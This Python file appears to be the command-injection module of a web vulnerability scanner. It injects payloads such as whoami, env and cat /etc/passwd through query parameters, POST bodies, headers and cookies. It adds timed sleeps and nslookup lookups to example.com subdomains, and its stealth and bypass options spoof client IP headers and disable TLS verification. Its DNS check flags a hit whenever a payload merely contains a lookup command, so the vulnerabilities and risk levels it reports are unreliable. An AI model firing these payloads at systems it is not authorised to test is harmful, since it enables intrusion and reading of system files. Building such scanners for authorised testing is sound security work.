#!/usr/bin/env python3
import json
import random
import time
import re
import ssl
import string
from copy import deepcopy
from urllib.parse import urlparse, urlunparse, urlencode, parse_qsl
from typing import Dict, List, Union, Optional, Tuple, Any
import requests
import settings
from .vulnerability_base import VulnerabilityModule

ERROR_SIGNATURES = {
    "unix": ["sh: 1:", "/bin/sh:", "bash:", "zsh:", "fish:", "syntax error",
             "unexpected token", "cannot execute", "permission denied",
             "no such file or directory", "command not found", "unexpected EOF"],
    "windows": ["is not recognized as an internal or external command",
                "the system cannot find the path specified", "cmd.exe",
                "powershell", "term not recognized", "was unexpected at this time"],
    "database": ["sql syntax", "mysql_fetch_array", "postgresql", "ora-", "pl/sql"]
}

SENSITIVE_PARAMS = ["cmd", "exec", "query", "search", "id", "file", "path", "dir", "action",
                    "command", "execute", "run", "option", "callback", "function"]

COMMAND_SEPARATORS = {
    "unix": [";", "&&", "|", "`", "$(", ");", "&&'", "&&\"", "|'", "|\"", "';'", "\";\"", "\n", "\r\n"],
    "windows": ["&", "|", "%26", "\n", "\r\n"],
    "advanced": ["%0a", "%0d", "%0a%0d", "%26%26", "%7c"]
}

PAYLOAD_TEMPLATES = {
    "echo": {
        "unix": ["&& echo QXSD", "; echo QXSD", "| echo QXSD", "&& printf QXSD", "`echo QXSD`", "$(echo QXSD)"],
        "windows": ["& echo QXSD", "| echo QXSD"],
        "advanced": ["%26%26 echo QXSD", "%7c echo QXSD"]
    },
    "time": {
        "unix": ["&& sleep 4", "; sleep 4", "| sleep 4", "&& ping -c 4 127.0.0.1"],
        "windows": ["& timeout /T 4", "& ping -n 4 127.0.0.1>nul"],
        "advanced": ["%26%26 sleep 4", "%7c sleep 4"]
    },
    "dns": {
        "unix": ["&& nslookup QXSD.example.com", "; dig QXSD.example.com"],
        "windows": ["& nslookup QXSD.example.com"],
        "advanced": ["%26%26 nslookup QXSD.example.com"]
    }
}

DEFAULT_POST_PARAMS = ["cmd", "q", "query", "search", "id", "command", "exec", "run"]

class Scanner(VulnerabilityModule):
    name = "command_injection"
    enabled = True
    useproxy = getattr(settings, "USEPROXY", True)
    max_tests = 100
    baseline_samples = 5
    delay_range = (0.1, 0.3)
    time_threshold = 4.0
    debug_mode = False
    aggressive_mode = False
    bypass_protection = False
    stealth_mode = False
    custom_payloads = []
    
    def __init__(self, target, session=None, timeout=10, debug=False, aggressive=False,
                 custom_payloads=None, bypass_protection=False, stealth=False, **kwargs):
        super().__init__(target, session, timeout, debug)
        self.aggressive_mode = aggressive
        self.debug_mode = debug
        self.bypass_protection = bypass_protection
        self.stealth_mode = stealth
        self.custom_payloads = custom_payloads if custom_payloads else []
        if self.bypass_protection:
            self.session.verify = False
            ssl._create_default_https_context = ssl._create_unverified_context
            requests.packages.urllib3.disable_warnings()
        if self.stealth_mode:
            stealth_agents = [
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15",
                "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
                "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15"
            ]
            self.session.headers.update({
                "User-Agent": random.choice(stealth_agents),
                "X-Forwarded-For": f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 254)}",
                "X-Real-IP": f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 254)}",
                "Accept": "*/*",
                "Connection": "keep-alive",
                "Upgrade-Insecure-Requests": "1"
            })
    
    @property
    def user_agent(self) -> str:
        return getattr(settings, "USERAGENT", getattr(settings, "USER_AGENT", "QX-Scanner/2.0"))
    
    def _clean_response_content(self, content: str) -> str:
        patterns_to_remove = [
            r'<script[^>]*>.*?</script>',
            r'<style[^>]*>.*?</style>',
            r'<!--.*?-->',
            r'<![CDATA[.*?]]>',
            r'\d{4}-\d{2}-\d{2} \d{2}:\d{2}:\d{2}',
            r'\d{2}/\d{2}/\d{4}',
            r'\d{2}:\d{2}:\d{2}',
            r'\b\d{10,}\b',
            r'[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}',
            r'csrf_token[^=]*=[^&]*',
            r'csrf-token[^=]*=[^&]*',
            r'csrf[^=]*=[^&]*',
            r'session[^=]*=[^&]*',
            r'sessionid[^=]*=[^&]*',
            r'phpsessid[^=]*=[^&]*',
            r'rand[^=]*=[^&]*',
            r'random[^=]*=[^&]*',
            r'token[^=]*=[^&]*',
            r'google_analytics[^;]*;',
            r'gtag[^;]*;',
            r'fbq[^;]*;'
        ]
        
        cleaned_content = content
        for pattern in patterns_to_remove:
            cleaned_content = re.sub(pattern, '', cleaned_content, flags=re.DOTALL | re.IGNORECASE)
        
        cleaned_content = re.sub(r'\s+', ' ', cleaned_content).strip()
        return cleaned_content
    
    def _analyze_boolean_test(self, response_content: str, baseline_content: str, 
                             response_status: int, baseline_status: int) -> bool:
        clean_response = self._clean_response_content(response_content)
        clean_baseline = self._clean_response_content(baseline_content)
        
        length_diff = abs(len(clean_response) - len(clean_baseline))
        content_diff = clean_response != clean_baseline
        
        return (
            content_diff and
            length_diff > 50 and
            response_status == baseline_status
        )
    
    def _analyze_error_based(self, response_content: str) -> Tuple[bool, str]:
        content_lower = response_content.lower()
        
        for db_type, patterns in ERROR_SIGNATURES.items():
            for pattern in patterns:
                if pattern in content_lower:
                    return True, db_type
        
        return False, ""
    
    def _analyze_time_based(self, response_time: float, baseline_time: float) -> bool:
        time_difference = response_time - baseline_time
        return time_difference > 4.0
    
    def _headers(self, extra: Optional[Dict[str, str]] = None) -> Dict[str, str]:
        headers = {
            "User-Agent": self.user_agent,
            "X-Scanner": "QX-ShadowDrop",
            "Accept": "*/*",
            "Connection": "keep-alive"
        }
        if extra:
            headers.update(extra)
        return headers
    
    def _sorted_params(self, params: List[str]) -> List[str]:
        priority_params = [p for p in params if p.lower() in SENSITIVE_PARAMS]
        other_params = [p for p in params if p.lower() not in SENSITIVE_PARAMS]
        return priority_params + other_params
    
    def _generate_random_string(self, length=8) -> str:
        return ''.join(random.choice(string.ascii_lowercase) for _ in range(length))
    
    def _generate_payloads(self, base_value: str, payload_type: str) -> List[str]:
        payloads = []
        if self.aggressive_mode:
            systems = ["unix", "windows", "advanced"]
            payload_count = 150
        else:
            systems = ["unix"]
            payload_count = 50
        
        if self.custom_payloads:
            for payload in self.custom_payloads[:payload_count]:
                payloads.append(f"{base_value}{payload}")
        
        for system in systems:
            if payload_type == "error":
                for sep in COMMAND_SEPARATORS[system]:
                    payloads.append(f"{base_value}{sep}whoami")
                    payloads.append(f"{base_value}{sep}id")
                    if self.aggressive_mode:
                        payloads.append(f"{base_value}{sep}uname -a")
                        payloads.append(f"{base_value}{sep}cat /etc/passwd")
                        payloads.append(f"{base_value}{sep}ls -la")
                        payloads.append(f"{base_value}{sep}pwd")
                        payloads.append(f"{base_value}{sep}env")
                        payloads.append(f"{base_value}{sep}ps aux")
            elif payload_type in PAYLOAD_TEMPLATES:
                for template in PAYLOAD_TEMPLATES[payload_type][system]:
                    if payload_type == "dns":
                        random_domain = f"{self._generate_random_string()}.example.com"
                        template = template.replace("QXSD.example.com", random_domain)
                    payloads.append(f"{base_value}{template}")
        
        if self.aggressive_mode and payload_type == "time":
            payloads.extend([
                f"{base_value} && sleep 8",
                f"{base_value}; sleep 8",
                f"{base_value} | sleep 8",
                f"{base_value} && ping -c 8 127.0.0.1",
                f"{base_value}; ping -c 8 127.0.0.1"
            ])
        
        if self.aggressive_mode and payload_type == "echo":
            payloads.extend([
                f"{base_value} && echo {self._generate_random_string()}",
                f"{base_value}; echo {self._generate_random_string()}",
                f"{base_value} | echo {self._generate_random_string()}",
                f"{base_value} && printf {self._generate_random_string()}",
                f"{base_value}; printf {self._generate_random_string()}"
            ])
        
        return list(set(payloads))[:payload_count]
    
    def _build_query_tests(self, url: str) -> List[Dict[str, Any]]:
        parsed = urlparse(url)
        query_params = dict(parse_qsl(parsed.query, keep_blank_values=True))
        tests = []
        if not query_params:
            base_url = url.rstrip("/")
            for payload in self._generate_payloads("1", "error"):
                tests.append({
                    "method": "GET",
                    "url": f"{base_url}?cmd={payload}",
                    "vector": "query",
                    "param": "cmd",
                    "kind": "error"
                })
            return tests
        
        for param in self._sorted_params(list(query_params.keys()))[:8]:
            base_value = query_params.get(param) or "1"
            for payload in self._generate_payloads(base_value, "error"):
                new_query = deepcopy(query_params)
                new_query[param] = payload
                new_url = parsed._replace(query=urlencode(new_query, doseq=True))
                tests.append({
                    "method": "GET",
                    "url": urlunparse(new_url),
                    "vector": "query",
                    "param": param,
                    "kind": "error"
                })
            for payload in self._generate_payloads(base_value, "echo"):
                new_query = deepcopy(query_params)
                new_query[param] = payload
                new_url = parsed._replace(query=urlencode(new_query, doseq=True))
                tests.append({
                    "method": "GET",
                    "url": urlunparse(new_url),
                    "vector": "query",
                    "param": param,
                    "kind": "echo"
                })
            if self.aggressive_mode:
                for payload in self._generate_payloads(base_value, "time"):
                    new_query = deepcopy(query_params)
                    new_query[param] = payload
                    new_url = parsed._replace(query=urlencode(new_query, doseq=True))
                    tests.append({
                        "method": "GET",
                        "url": urlunparse(new_url),
                        "vector": "query",
                        "param": param,
                        "kind": "time"
                    })
                for payload in self._generate_payloads(base_value, "dns"):
                    new_query = deepcopy(query_params)
                    new_query[param] = payload
                    new_url = parsed._replace(query=urlencode(new_query, doseq=True))
                    tests.append({
                        "method": "GET",
                        "url": urlunparse(new_url),
                        "vector": "query",
                        "param": param,
                        "kind": "dns"
                    })
        return tests
    
    def _build_body_tests(self, url: str, content_type: str) -> List[Dict[str, Any]]:
        tests = []
        data_key = "json" if content_type == "application/json" else "data"
        for param in self._sorted_params(DEFAULT_POST_PARAMS)[:8]:
            for payload in self._generate_payloads("1", "error"):
                tests.append({
                    "method": "POST",
                    "url": url,
                    "vector": f"body_{content_type.split('/')[-1]}",
                    "param": param,
                    "kind": "error",
                    data_key: {param: payload},
                    "headers": {"Content-Type": content_type}
                })
            for payload in self._generate_payloads("1", "echo"):
                tests.append({
                    "method": "POST",
                    "url": url,
                    "vector": f"body_{content_type.split('/')[-1]}",
                    "param": param,
                    "kind": "echo",
                    data_key: {param: payload},
                    "headers": {"Content-Type": content_type}
                })
            if self.aggressive_mode:
                for payload in self._generate_payloads("1", "time"):
                    tests.append({
                        "method": "POST",
                        "url": url,
                        "vector": f"body_{content_type.split('/')[-1]}",
                        "param": param,
                        "kind": "time",
                        data_key: {param: payload},
                        "headers": {"Content-Type": content_type}
                    })
                for payload in self._generate_payloads("1", "dns"):
                    tests.append({
                        "method": "POST",
                        "url": url,
                        "vector": f"body_{content_type.split('/')[-1]}",
                        "param": param,
                        "kind": "dns",
                        data_key: {param: payload},
                        "headers": {"Content-Type": content_type}
                    })
        return tests
    
    def _build_header_tests(self, url: str) -> List[Dict[str, Any]]:
        tests = []
        header_targets = ["User-Agent", "Referer", "X-Forwarded-For", "X-Real-IP"]
        if self.aggressive_mode:
            header_targets.extend(["X-Client-IP", "X-Originating-IP", "X-Remote-IP", "X-Requested-With", "Cookie"])
        for header in header_targets:
            for payload in self._generate_payloads("", "error"):
                tests.append({
                    "method": "GET",
                    "url": url,
                    "vector": "header",
                    "param": header,
                    "kind": "error",
                    "headers": {header: payload}
                })
        return tests
    
    def _build_cookie_tests(self, url: str) -> List[Dict[str, Any]]:
        tests = []
        cookie_targets = ["session", "auth", "token", "user", "id"]
        for cookie in cookie_targets:
            for payload in self._generate_payloads("", "error"):
                tests.append({
                    "method": "GET",
                    "url": url,
                    "vector": "cookie",
                    "param": cookie,
                    "kind": "error",
                    "cookies": {cookie: payload}
                })
        return tests
    
    def _build_tests(self, target: str) -> List[Dict[str, Any]]:
        tests = []
        tests.extend(self._build_query_tests(target))
        tests.extend(self._build_body_tests(target, "application/x-www-form-urlencoded"))
        tests.extend(self._build_body_tests(target, "application/json"))
        if self.aggressive_mode:
            tests.extend(self._build_header_tests(target))
            tests.extend(self._build_cookie_tests(target))
        
        unique_tests = []
        seen = set()
        for test in tests:
            test_key = (test["method"], test["url"], test["vector"], test.get("param"), test["kind"])
            if test_key not in seen:
                seen.add(test_key)
                unique_tests.append(test)
        
        return unique_tests[:self.max_tests]
    
    def _execute_request(self, method: str, url: str, headers: Dict[str, str],
                        data: Optional[Dict] = None, json_body: Optional[Dict] = None,
                        cookies: Optional[Dict] = None, timeout: int = 10) -> requests.Response:
        try:
            request_kwargs = {
                "headers": headers,
                "timeout": timeout,
                "allow_redirects": False,
                "verify": not self.bypass_protection
            }
            if cookies:
                request_kwargs["cookies"] = cookies
            if method == "GET":
                return self.session.get(url, **request_kwargs)
            else:
                if data:
                    request_kwargs["data"] = data
                if json_body:
                    request_kwargs["json"] = json_body
                return self.session.post(url, **request_kwargs)
        except (requests.RequestException, OSError) as e:
            if self.debug_mode:
                print(f"[CI-DEBUG] Request failed: {e}")
            raise
    
    def _calculate_baseline(self, url: str, timeout: int) -> float:
        latencies = []
        for i in range(self.baseline_samples):
            try:
                start_time = time.time()
                self._execute_request("GET", url, self._headers(), timeout=timeout)
                elapsed = time.time() - start_time
                latencies.append(elapsed)
                if self.debug_mode:
                    print(f"[CI-DEBUG] Baseline sample {i+1}: {elapsed:.3f}s")
            except Exception as e:
                if self.debug_mode:
                    print(f"[CI-DEBUG] Baseline sample {i+1} failed: {e}")
                latencies.append(1.0)
        latencies.sort()
        median = latencies[len(latencies) // 2]
        if self.debug_mode:
            print(f"[CI-DEBUG] Baseline latency: {median:.3f}s")
        return max(0.2, min(median, 5.0))
    
    def _check_dns_exfiltration(self, payload: str) -> bool:
        dns_indicators = ["nslookup", "dig", "host", "ping"]
        return any(indicator in payload.lower() for indicator in dns_indicators)
    
    def _process_test(self, test: Dict, baseline: Optional[float], timeout: int) -> Dict[str, Any]:
        if self.debug_mode:
            print(f"[CI-DEBUG] Testing: {test['method']} {test['url']} [{test['kind']}]")
        time.sleep(random.uniform(*self.delay_range))
        try:
            headers = self._headers(test.get("headers", {}))
            request_timeout = max(timeout, 15) if test["kind"] == "time" else timeout
            start_time = time.time()
            response = self._execute_request(
                test["method"],
                test["url"],
                headers,
                data=test.get("data"),
                json_body=test.get("json"),
                cookies=test.get("cookies"),
                timeout=request_timeout
            )
            elapsed = time.time() - start_time
            cleaned_response = self._clean_response_content(response.text or "")
            response_text = cleaned_response.lower()
            
            result = {
                "tested_url": test["url"],
                "method": test["method"],
                "vector": test["vector"],
                "param": test.get("param"),
                "kind": test["kind"],
                "status_code": response.status_code,
                "response_time": round(elapsed, 3)
            }
            
            if test["kind"] in ("error", "echo"):
                result["match_error"] = any(
                    sig in response_text for sig in
                    ERROR_SIGNATURES["unix"] + ERROR_SIGNATURES["windows"]
                )
                if test["kind"] == "echo":
                    result["match_echo"] = "qxsd" in response_text
            
            if test["kind"] == "time" and baseline:
                time_delay = elapsed - baseline
                result["time_delay"] = round(time_delay, 3)
                if time_delay > self.time_threshold:
                    confirm_start = time.time()
                    self._execute_request(
                        test["method"],
                        test["url"],
                        headers,
                        data=test.get("data"),
                        json_body=test.get("json"),
                        cookies=test.get("cookies"),
                        timeout=request_timeout
                    )
                    confirm_delay = time.time() - confirm_start - baseline
                    result["blind_delay"] = confirm_delay > 3.5
                    result["confirm_delay"] = round(confirm_delay, 3)
            
            if test["kind"] == "dns":
                result["dns_requested"] = self._check_dns_exfiltration(str(test.get("data", test.get("json", {}))))
            
            return result
        except Exception as e:
            if self.debug_mode:
                print(f"[CI-DEBUG] Test failed: {e}")
            return {
                "tested_url": test["url"],
                "method": test["method"],
                "vector": test["vector"],
                "param": test.get("param"),
                "kind": test["kind"],
                "error": str(e)
            }
    
    def scan(self) -> Dict[str, Any]:
        if self.debug_mode:
            print(f"[CI-DEBUG] Starting command injection scan for {self.target}")
            print(f"[CI-DEBUG] Mode: {'Aggressive' if self.aggressive_mode else 'Standard'}")
            print(f"[CI-DEBUG] Stealth: {'Enabled' if self.stealth_mode else 'Disabled'}")
        
        scan_config = {
            "timeout": self.timeout,
            "target": self.target,
            "aggressive": self.aggressive_mode,
            "stealth": self.stealth_mode,
            "debug_mode": self.debug_mode,
            "bypass_protection": self.bypass_protection
        }
        
        tests = self._build_tests(scan_config["target"])
        if self.debug_mode:
            print(f"[CI-DEBUG] Generated {len(tests)} test cases")
        
        baseline = None
        if any(test["kind"] == "time" for test in tests):
            baseline = self._calculate_baseline(
                scan_config["target"],
                min(scan_config["timeout"], 8)
            )
        
        evidence = []
        for i, test in enumerate(tests):
            if self.debug_mode and i % 5 == 0:
                print(f"[CI-DEBUG] Completed {i}/{len(tests)} tests")
            evidence.append(self._process_test(test, baseline, scan_config["timeout"]))
        
        direct_hits = sum(
            1 for e in evidence
            if e.get("match_error", False) or e.get("match_echo", False)
        )
        blind_hits = sum(
            1 for e in evidence
            if e.get("blind_delay", False)
        )
        dns_hits = sum(
            1 for e in evidence
            if e.get("dns_requested", False)
        )
        
        if direct_hits > 0:
            risk_level = "critical" if direct_hits > 2 else "high"
        elif blind_hits > 0:
            risk_level = "high" if blind_hits > 1 else "medium"
        elif dns_hits > 0:
            risk_level = "medium"
        else:
            risk_level = "low"
        
        vulnerabilities = []
        for e in evidence:
            if e.get("match_error") or e.get("match_echo") or e.get("blind_delay") or e.get("dns_requested"):
                vulnerabilities.append({
                    "vector": e["vector"],
                    "parameter": e.get("param"),
                    "type": e["kind"],
                    "evidence": {k: v for k, v in e.items() if k not in ["tested_url", "method", "vector", "param", "kind"]}
                })
        
        return {
            "ok": True,
            "risk": risk_level,
            "vulnerabilities_found": len(vulnerabilities),
            "direct_hits": direct_hits,
            "blind_hits": blind_hits,
            "dns_hits": dns_hits,
            "vulnerabilities": vulnerabilities,
            "config": scan_config,
            "baseline_latency": baseline,
            "notes": "Comprehensive command injection testing with error, echo, time-based, and DNS exfiltration detection"
        }
